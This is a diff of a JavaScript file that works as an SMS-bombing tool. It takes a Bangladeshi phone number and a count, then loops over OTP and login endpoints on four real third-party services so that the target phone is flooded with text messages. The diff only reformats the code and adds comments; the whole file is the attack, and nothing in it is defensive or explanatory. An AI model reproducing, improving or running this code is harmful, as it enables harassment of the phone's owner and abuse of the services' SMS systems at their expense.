@@ -1,110 +1,110 @@
-$('#phone').on('focusin',function(){
-    $('.number_text').attr('id','positionChange');
+$('#phone').on('focusin', function () {
+    $('.number_text').attr('id', 'positionChange');
+});
 
-});
-$('#phone').on('focusout', function(){
+$('#phone').on('focusout', function () {
     if (!this.value) {
-        $('.number_text').removeAttr('id'); 
+        $('.number_text').removeAttr('id');
     }
 });
-$('#amount').on('focusin',function(){
-    $('.amount_text').attr('id','positionChange');
+
+$('#amount').on('focusin', function () {
+    $('.amount_text').attr('id', 'positionChange');
 });
-$('#amount').on('focusout', function(){
+
+$('#amount').on('focusout', function () {
     if (!this.value) {
-        $('.amount_text').removeAttr('id'); 
+        $('.amount_text').removeAttr('id');
     }
 });
-$('#submit').click(()=>{
+
+$('#submit').click(() => {
     const number = $('#phone').val();
     const amount = $('#amount').val();
-    if (number.length != 11){
-        alert("wrong number");
-    }
-    else if (amount.length === 0){
-        alert("wrong amount");
-    }else{
 
-        let i= 0;
-        while(i < amount){
-            var data = JSON.stringify({
-                "mobileNumber": "88"+number+"",
+    if (number.length !== 11) {
+        alert("wrong number");
+    } else if (amount.length === 0) {
+        alert("wrong amount");
+    } else {
+        let i = 0;
+        while (i < amount) {
+            // First Axios request
+            var data1 = JSON.stringify({
+                "mobileNumber": "88" + number + "",
                 "countryId": 22
-              });
-              var config = {
+            });
+            var config1 = {
                 method: 'post',
                 url: 'https://api.englishmojabd.com/api/v1/auth/login',
-                headers: { 
-                  'Content-Type': 'application/json'
+                headers: {
+                    'Content-Type': 'application/json'
                 },
-                data : data
-              };axios(config).then(function (response) {console.log(JSON.stringify(response.data));
-              }).catch(function (error) {console.log(error);});  
-              i++;
+                data: data1
+            };
+            axios(config1).then(function (response) {
+                console.log(JSON.stringify(response.data));
+            }).catch(function (error) {
+                console.log(error);
+            });
+            i++;
 
-              var data = JSON.stringify({
-                "phone": "+88"+number+""
-              });
-              var config = {
+            // Second Axios request
+            var data2 = JSON.stringify({
+                "phone": "+88" + number + ""
+            });
+            var config2 = {
                 method: 'post',
                 url: 'https://api.eat-z.com/auth/customer/signin',
-                headers: { 
-                  'Content-Type': 'application/json'
+                headers: {
+                    'Content-Type': 'application/json'
                 },
-                data : data
-              };
-
-              axios(config)
-              .then(function (response) {
+                data: data2
+            };
+            axios(config2).then(function (response) {
                 console.log(JSON.stringify(response.data));
-                i++
-              })
-              .catch(function (error) {
+                i++;
+            }).catch(function (error) {
                 console.log(error);
-              });
-              i++;
+            });
+            i++;
 
-              var config = {
+            // Third Axios request
+            var config3 = {
                 method: 'get',
-                url: 'http://apibeta.iqra-live.com/api/v2/sent-otp/'+number,
-                headers: { 
-                  'x-user-channel': 'apps'
+                url: 'http://apibeta.iqra-live.com/api/v2/sent-otp/' + number,
+                headers: {
+                    'x-user-channel': 'apps'
                 }
-              };
-
-              axios(config)
-              .then(function (response) {
+            };
+            axios(config3).then(function (response) {
                 console.log(JSON.stringify(response.data));
-
-              })
-              .catch(function (error) {
+            }).catch(function (error) {
                 console.log(error);
-              });
-              i++;
-              var data = JSON.stringify({
-                "phone": ""+number+"",
+            });
+            i++;
+
+            // Fourth Axios request
+            var data4 = JSON.stringify({
+                "phone": "" + number + "",
                 "country_code": "+880",
                 "fcm_token": null
-              });
-
-              var config = {
+            });
+            var config4 = {
                 method: 'post',
                 url: 'https://developer.quizgiri.xyz/api/v2.0/send-otp',
-                headers: { 
-                  'Content-Type': 'application/json'
+                headers: {
+                    'Content-Type': 'application/json'
                 },
-                data : data
-              };
-              axios(config)
-              .then(function (response) {
+                data: data4
+            };
+            axios(config4).then(function (response) {
                 console.log(JSON.stringify(response.data));
-
-              })
-              .catch(function (error) {
+            }).catch(function (error) {
                 console.log(error);
-              });
+            });
 
-        };
-        alert(`${amount} SMS Sent. Keep the Browser Three minutes for complete your mission.`)
+        }
+        alert(`${amount} SMS Sent. Keep the Browser Three minutes for complete your mission.`);
     }
 });
